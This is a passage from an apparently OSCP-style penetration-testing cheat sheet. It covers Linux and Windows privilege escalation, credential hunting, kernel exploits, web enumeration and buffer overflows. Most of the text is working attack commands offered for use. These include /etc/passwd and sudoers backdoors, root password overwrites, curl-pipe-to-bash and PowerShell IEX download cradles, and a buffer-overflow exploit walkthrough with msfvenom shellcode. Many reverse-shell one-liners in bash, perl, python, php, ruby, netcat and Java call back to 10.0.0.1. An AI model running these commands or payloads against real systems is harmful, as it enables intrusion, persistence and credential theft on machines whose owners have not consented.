| /etc/passwd               | manually add a user with a password of "password" using the following syntax <br> user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |

- **Root SSH Key** If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
  - `cat /etc/ssh/sshd_config | grep PermitRootLogin`
- **Add SUDOers** If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser): `/etc/sudoers`

  ```shell
  root    ALL=(ALL:ALL) ALL
  %sudo   ALL=(ALL:ALL) ALL
  myuser    ALL=(ALL) NOPASSWD:ALL
  ```

- **Set Root Password** We can also change the root password on the host if we can write to any file as root:`/etc/shadow`

  ```shell
  printf root:>shadown
  openssl passwd -1 -salt salty password >>shadow
  ```

#### Password Hunting

  ```shell
  grep --color=auto -rnw ‘/’ -ie “PASSWORD” --color=always 2>/dev/null  
  grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2>/dev/null  
  ```

<https://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html>  

  ```shell
  locate password | more  
  locate passw | more  
  locate pass | more  
  ```

  ```shell
  find / -name authorized_keys  
  find / -name id_rsa 2>/dev/null  
  ```

#### Kernel Exploits

27. Based on the Kernel version, do we have some reliable exploits that can be used?

| Kernel Version                                                                       | Reliable exploit                               |
|--------------------------------------------------------------------------------------|------------------------------------------------|
| UDEV - Linux Kernel < 2.6 & UDEV < 1.4.1 - CVE-2009-1185 - April 2009                | Ubuntu 8.10, Ubunto 9.04, Gentoo               |
| RDS - Linux Kernel <= 2.6.36-rc8 - CVE-2010-3904 - Linux Exploit -                   | Centos 4/5                                     |
| perf_swevent_init - Linux Kernel < 3.8.9 (x86-64) - CVE-2013-2094 - June 2013        | Ubuntu 12.04.2                                 |
| mempodipper - Linux Kernel 2.6.39 < 3.2.2 (x86-64) - CVE-2012-0056 - January 2012    | Ubuntu 11.10, Ubuntu 10.04, Redhat 6, Oracle 6 |
| Dirty Cow - Linux Kernel 2.6.22 < 3.2.0/3.13.0/4.8.3 - CVE-2016-5195 - October 2016  | Ubuntu 12.04, Ubuntu 14.04, Ubuntu 16.04       |
| KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 2017 | Ubuntu 14.04, Ubuntu 16.04                     |

Great list here: <https://github.com/lucyoa/kernel-exploits>

#### Automated Linux Enumeration Scripts

28. It is always a great idea to automate the enumeration process once you understand what you are looking for.

##### LinEmum.sh

LinEnum is a handy method of automating Linux enumeration. It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.

- First we need to git a copy to our local Kali linux machine: `git clone https://github.com/rebootuser/LinEnum.git`
- Next we can serve it up in the python simple web server:

  ```shell
  root@kali:~test# cd LinEnum/
  root@kali:~test/LinEnum# ls
  root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...
  ```
- And now on our remote Linux machine we can pull down the script and pipe it directly to Bash: `www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash`
- And the enumeration script should run on the remote machine.

#### CTF Machine Tactics

Often it is easy to identify when a machine was created by the date / time of file edits. We can create a list of all the files with a modify time in that timeframe with the following command: `find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt`
- This has helped me to find interesting files on a few different CTF machines. Recursively searching for passwords is also a handy technique:
  `grep -ri "passw" .`
- Wget Pipe a remote URL directory to Bash (linpeas):
  `wget -q -O - "http://10.10.10.10/linpeas.sh" | bash`
- Curl Pipe a remote URL directly to Bash (linpeas):
  `curl -sSk "http://10.10.10.10/linpeas.sh" | bash`

#### Using SSH Keys

Often, we are provided with password protected SSH keys on CTF boxes. It it helpful to be able to quicky crack and add these to your private keys.
- First we need to convert the ssh key using John:
  `kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john...`
- Next we will need to use that format to crack the password:
  `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john`
- John should output a password for the private key.


### Windows OS Enumeration

_NOTE_ There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project: <https://lolbas-project.github.io/>

- `net config Workstation`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
- `hostname`
- `net users`
- `net user <username>`
- `net config Workstation`
- `ipconfig /all`
- `route print`
- `arp -A`
- `netstat -ano`
- `netsh firewall show state`
- `netsh firewall show config`
- `schtasks /query /fo LIST /v`
- `tasklist /SVC`
- `net start`
- `DRIVERQUERY`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `dir /s *pass* == *cred* == *vnc* == *.config*`
- `findstr /si password *.xml*.ini *.txt`
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`
- `Vulnerability Scanning with Nmap`
- What is running on the machine? If we are able to run WMIC we can pull rich details on the services and applications running:
  ```txt
  wmic service list full > services.txt
  wmic process > processes.txt
  ```
- Or alternatively: `tasklist > processes.txt`
- Has a Windows Auto-login Password been set?
      `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
- Dump a tree of all the folders / files on the HDD
      `tree c:\ > c:\users\public\folders.txt`
- Or for a list of files: `dir /s c:\ > c:\users\public\files.txt`
- Nmap Exploit Scripts
  [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)
- Nmap search through vulnerability scripts  
  ```
  cd /usr/share/nmap/scripts/  
  ls -l \*vuln\*
  ```

- Nmap search through Nmap Scripts for a specific keyword  
  `ls /usr/share/nmap/scripts/\* | grep ftp`
- Scan for vulnerable exploits with nmap  
  `nmap --script exploit -Pn $ip`
- NMap Auth Scripts  
  [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)
- Nmap Vuln Scanning  
  [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)
- NMap DOS Scanning  

  ```
  nmap --script dos -Pn $ip  
  NMap Execute DOS Attack  
  nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
  http-slowloris.runforever=true
  ```
- Scan for coldfusion web vulnerabilities  
  `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`
- Anonymous FTP dump with Nmap  
  `nmap -v -p 21 --script=ftp-anon.nse $ip-254`
- SMB Security mode scan with Nmap  
  `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

#### Automated Windows Enumeration Scripts

We are also going to look a a few automated methods of performing Windows Enumeration including:

- WindownPrivEsc.exe
- Sherlock
- Watson
- JAWZ
- Seatbelt

##### Running Windows Privesc Check (windows-privesc-check)

The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation. It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in. Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!

- First we will need to clone the latest version to our environment:

  ```bash
  root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check
  Cloning into 'windows-privesc-check'...
  remote: Enumerating objects: 1232, done.
  remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232
  Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done.
  Resolving deltas: 100% (897/897), done.
  ```

- Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:

  ```bash
  root@kali:~/tools# cd windows-privesc-check/
  root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...
  ```

- Now we will need to transfer the file to our remote windows box:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");`

- And now we run the executeable on the remote machine. I like run with all the audit enabled like so:

  ```CMD
  C:\Users\Admin>cd ..
  C:\Users>cd Public
  C:\Users\Public>cd Downloads
  C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
  windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
  ```

- The windows-privesc-check will create a detailed HTML report and text based report for your review.

##### Running Sherlock

Sherlock is a powershell library with a number of privledge escalation checkers built in. We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.

  ```bash
  root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
  Cloning into 'Sherlock'...
  remote: Enumerating objects: 3, done.
  remote: Counting objects: 100% (3/3), done.
  remote: Compressing objects: 100% (3/3), done.
  remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
  Unpacking objects: 100% (75/75), done.
  root@kali:~test# cd Sherlock/
  root@kali:~test/Sherlock# ls
  LICENSE  README.md  Sherlock.ps1
  root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
  root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...
  ```

- Now we can run this from the remote Windows CMD shell:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"`
- Or from a Windows Powershell:
  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')`

##### Running Watson

Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author. It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version.

- First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around:

  ```CMD
  cd \Windows\Microsoft.NET\Framework\
  dir /s msbuild
  ```

- Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github:

  `git clone https://github.com/rasta-mouse/Watson.git`
- And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the "Target Framework:" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B).

- Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:

  ```bash
  root@kali:~/tools# cd Watson/
  root@kali:~/tools/Watson# python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...
  ```

- Now we will need to transfer the compiled Watson.exe file to our remote windows box:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/Watson.exe\", \"C:\\Users\\Public\\Downloads\\Watson.exe\");`

And now we run the executeable on the remote machine. I like run with all the audit enabled like so:

  ```CMD
  C:\Users\Admin>cd ..
  C:\Users>cd Public
  C:\Users\Public>cd Downloads
  C:\Users\Public\Downloads>Watson.exe
  ```

##### Running JAWS - Just Another Windows (Enum) Script

JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD.
  `git clone https://github.com/411Hall/JAWS`

- Now we can run this from the remote Windows CMD shell:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1'))"`
- Or from a Windows Powershell:
  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1')`

And we should see the following output start to appear:
```CMD
Running J.A.W.S. Enumeration
  - Gathering User Information
  - Gathering Processes, Services and Scheduled Tasks
  - Gathering Installed Software
```

##### CopyAndPasteEnum.bat

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial). Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:

  ```bat
  echo Windows Privilege Escalation Report - Copy and Paste Version (No file upload required) - Copy and Paste this script into your reverse shell console to create a simple report file.
  @echo --------- BASIC WINDOWS RECON ---------  > report.txt
  timeout 1
  net config Workstation  >> report.txt
  timeout 1
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
  timeout 1
  hostname >> report.txt
  timeout 1
  net users >> report.txt
  timeout 1
  ipconfig /all >> report.txt
  timeout 1
  route print >> report.txt
  timeout 1
  arp -A >> report.txt
  timeout 1
  netstat -ano >> report.txt
  timeout 1
  netsh firewall show state >> report.txt	
  timeout 1
  netsh firewall show config >> report.txt
  timeout 1
  schtasks /query /fo LIST /v >> report.txt
  timeout 1
  tasklist /SVC >> report.txt
  timeout 1
  net start >> report.txt
  timeout 1
  DRIVERQUERY >> report.txt
  timeout 1
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
  timeout 1
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
  timeout 1
  dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
  timeout 1
  findstr /si password *.xml *.ini *.txt >> report.txt
  timeout 1
  reg query HKLM /f password /t REG_SZ /s >> report.txt
  timeout 1
  reg query HKCU /f password /t REG_SZ /s >> report.txt 
  timeout 1
  dir "C:\"
  timeout 1
  dir "C:\Program Files\" >> report.txt
  timeout 1
  dir "C:\Program Files (x86)\"
  timeout 1
  dir "C:\Users\"
  timeout 1
  dir "C:\Users\Public\"
  timeout 1
  echo REPORT COMPLETE!
  ```

##### CopyAndPasteFileDownloader.bat

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)

  ```bat
  echo Set args = Wscript.Arguments  > webdl.vbs
  timeout 1
  echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
  timeout 1
  echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
  timeout 1
  echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
  timeout 1
  echo xHttp.Open "GET", Url, False  >> webdl.vbs
  timeout 1
  echo xHttp.Send  >> webdl.vbs
  timeout 1
  echo with bStrm      >> webdl.vbs
  timeout 1
  echo 	.type = 1 '      >> webdl.vbs
  timeout 1
  echo 	.open      >> webdl.vbs
  timeout 1
  echo 	.write xHttp.responseBody      >> webdl.vbs
  timeout 1
  echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
  timeout 1
  echo end with >> webdl.vbs
  timeout 1
  echo
  ```

The file can be run using the following syntax: `C:\temp\cscript.exe webdl.vbs`

##### windows_recon.bat

An uploadable batch file for performing basic windows enumeration.

  ```bat
  echo --------- net config Workstation ---------  > report.txt
  net config Workstation  >> report.txt
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
  hostname >> report.txt
  net users >> report.txt
  ipconfig /all >> report.txt
  route print >> report.txt
  arp -A >> report.txt
  netstat -ano >> report.txt
  netsh firewall show state >> report.txt	
  netsh firewall show config >> report.txt
  schtasks /query /fo LIST /v >> report.txt
  tasklist /SVC >> report.txt
  net start >> report.txt
  DRIVERQUERY >> report.txt
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
  dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
  findstr /si password *.xml *.ini *.txt >> report.txt
  reg query HKLM /f password /t REG_SZ /s >> report.txt
  reg query HKCU /f password /t REG_SZ /s >> report.txt

  sc qc Spooler >> report.txt
  accesschk.exe -ucqv Spooler >> report.txt
  ```

- References:
  - [https://medium.com/@hakluke](mailto:https://medium.com/@hakluke)
  - <https://daya.blog/2018/01/06/windows-privilege-escalation/>
  - <https://pentestlab.blog/2017/04/19/stored-credentials/>
  - <https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/>
  - <https://www.abatchy.com/>
  - <https://gist.github.com/egre55>
  - <https://github.com/egre55/ultimate-file-transfer-list>
  - <https://lolbas-project.github.io/>
  - <https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>
  - <https://github.com/GhostPack/Seatbelt>
  - <https://github.com/rasta-mouse/Watson>
  - <http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html>
  - <https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb>

## File Enumeration

- Find UID 0 files root execution
  - `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
- Get handy linux file system enumeration script (/var/tmp)  
  - `wget https://highon.coffee/downloads/linux-local-enum.sh`
  - `chmod +x ./linux-local-enum.sh`
  - `./linux-local-enum.sh`
- Find executable files updated in August  
  - `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`
- Find a specific file on linux  
  - `find /. -name suid\*`
- Find all the strings in a file  
  - `strings <filename>`
- Determine the type of a file  
  - `file <filename>`
- Find all files with "password" in directory
  - `grep -Ri password . | grep -v Lang`

## HTTP Enumeration ( Always search for .txt,php,asp,aspx files )

- Search for folders with gobuster:  
  - `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip -t 80 -x php,txt,asp,aspx`
- OWasp DirBuster - Http folder enumeration - can take a dictionary file
- Dirb - Directory brute force finding using a dictionary file  ( Very Slow )
  - `dirb http://$ip/ wordlist.dict`
  - `dirb <http://vm/>`
- Dirb against a proxy
  - `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`
- Nikto  
  - `nikto -h $ip`
- HTTP Enumeration with NMAP  
  - `nmap --script=http-enum -p80 -n $ip/24`
- Nmap Check the server methods  
  - `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`
- Get Options available from web server
  - `curl -vX OPTIONS vm/test`
- Uniscan directory finder:  
  - `uniscan -qweds -u <http://vm/>`
- Wfuzz - The web brute forcer

    ```shell
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
    ```
  - Recurse level 3
      `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`

- We can also use a tool called dirhunt to search for interesting files

- Open a service using a port knock (Secured with Knockd)  
  - `for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done`
- WordPress Scan - Wordpress security scanner ( We can use the --enumerate function to enumerate users and bruteforce )
  - `wpscan --url $ip/blog --proxy $ip:3129`
- RSH Enumeration - Unencrypted file transfer system
  - `auxiliary/scanner/rservices/rsh_login`
- Finger Enumeration
  - `finger @$ip`
  - `finger batman@$ip`
- TLS & SSL Testing
  - `./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html`
- Proxy Enumeration (useful for open proxies)
  - `nikto -useproxy <http://$ip:3128> -h $ip`

## Buffer Overflow

  - DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)

### Nmap Fuzzers

- NMap Fuzzer List [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)
- NMap HTTP Form Fuzzer  
  - `nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip`
- Nmap DNS Fuzzer  
  - `nmap --script dns-fuzz --script-args timelimit=2h $ip -d`
- Use the fuzzer learned in the course
- MSFvenom  
  [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

### Windows Buffer Overflows

- Controlling EIP

    ```shell
    locate pattern_create
    pattern_create.rb -l 2700
    locate pattern_offset
    pattern_offset.rb -q 39694438
    ```

- Verify exact location of EIP - [\*] Exact match at offset 2606
  - `buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90`
- Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
- Use Mona to determine a module that is unprotected
- Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
- Use NASM to determine the HEX code for a JMP ESP instruction
    
    ```
    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    JMP ESP  
    00000000 FFE4 jmp esp
    ```

- Run Mona in immunity log window to find (FFE4) XEF command

    ```shell
    !mona find -s "\xff\xe4" -m slmfc.dll  
    found at 0x5f4a358f - Flip around for little endian format
    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
    ```
    **We can use the view -> show executables modules and search for the instruction in the immunity debugger.**

- MSFVenom to create payload
  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
- Final Payload with NOP slide  
  - `buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode`
- Create a PE Reverse Shell
  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe`
- Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai
  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`
- Create a PE reverse shell and embed it into an existing executable  
  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`
- Create a PE Reverse HTTPS shell
  - `msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe`
- You can remove `\x00\x0a\x0d\x20` almost in every app.
- FTP - > \x00\x0d\x0a\x20\x40

## Shells

- Netcat Shell Listener  
  - `nc -nlvp 4444`

- Spawning a TTY Shell - Break out of Jail or limited shell
      You should almost always upgrade your shell after taking control of an apache or www user.
      (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
      (hint: sudo -l to see what you can run)

- You may encounter limited shells that use rbash and only allow you to execute a single command per session. You can overcome this by executing an SSH shell to your localhost:

  ```shell
  ssh user@$ip nc $localip 4444 -e /bin/sh
  enter user's password
  python -c 'import pty; pty.spawn("/bin/sh")'
  export TERM=linux
  ```

  - `python -c 'import pty; pty.spawn("/bin/sh")'`
  - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`
  - `echo os.system('/bin/bash')`
  - `/bin/sh -i`
  - `perl —e 'exec "/bin/sh";'`
  - perl: `exec "/bin/sh";`
  - ruby: `exec "/bin/sh"`
  - lua: `os.execute('/bin/sh')`
  - From within IRB: `exec "/bin/sh"`
  - From within vi: `:!bash`
      or
  - `:set shell=/bin/bash:shell`
  - From within vim `':!bash':`
  - From within nmap: `!sh`
  - From within tcpdump: `echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root`
  - From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`

- Pen test monkey PHP reverse shell  
  - Bash
    - Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
      `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
  - PERL
    - Here’s a shorter, feature-free version of the perl-reverse-shell:
      `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    - There’s also an alternative PERL revere shell here.
  - Python
    - This was tested under Linux / Python 2.7:
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
  - PHP
    - This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
      `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
    - If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
  - Ruby
      `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
  - Netcat
    - Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
      `nc -e /bin/sh 10.0.0.1 1234`
    - If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
  - Java

    ```Java
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    ```
    *Untested submission from anonymous reader*
  - xterm
    - One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
            `xterm -display 10.0.0.1:1`
    - To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
            `Xnest :1`
    - You’ll need to authorise the target to connect to you (command also run on your host):
            `xhost +targetip`
    [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

  - php-findsock-shell - turns PHP port 80 into an interactive shell  
      [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)

  - Perl Reverse Shell ( Very helpfull )  
      [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

  - PHP powered web browser Shell b374k with file upload etc.  
      [https://github.com/b374k/b374k](https://github.com/b374k/b374k)

  - Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell
      <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1>

  - Web Backdoors from Fuzzdb
      <https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors>

- Creating Meterpreter Shells with [MSFVenom](http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/)
  - *Linux*
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
  - *Windows*
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
  - *Mac*
    - `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`

  **Web Payloads**

    - *PHP*
      - `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
      OR
      - `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
    - Then we need to add the *<?php* at the first line of the file so that it will execute as a PHP webpage:
      - `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
    - *ASP*
      - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
    - *JSP*
      - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
    - *WAR*
      - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

  **Scripting Payloads**

    - *Python*
  `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
    - *Bash*
      - `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
    - *Perl*
      - `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`

  **Shellcode**

  For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

    - *Linux Based Shellcode*
